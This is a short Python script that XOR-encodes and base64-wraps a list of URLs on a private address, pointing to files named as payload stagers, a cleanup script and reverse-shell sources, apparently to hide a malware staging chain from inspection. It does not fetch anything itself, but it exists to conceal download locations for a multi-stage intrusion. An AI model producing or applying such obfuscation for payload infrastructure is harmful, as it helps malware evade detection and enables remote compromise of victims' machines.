import base64

def xor_encrypt(plaintext, key):
    xored = bytes([ord(c) ^ key for c in plaintext])
    return base64.b64encode(xored).decode()

# List of URLs to encrypt
urls = [
    "192.168.198.129:9999/stager1.py",
    "192.168.198.129:8080/clean.sh",
    "192.168.198.129:7777/stager2.py",
    "192.168.198.129:4444/stage1_rev.c",
    "192.168.198.129:5555/stage2_rev.c"
]

key = 0x42

for url in urls:
    encrypted = xor_encrypt(url, key)
    print(f"Encrypted URL ({url}): {encrypted}")
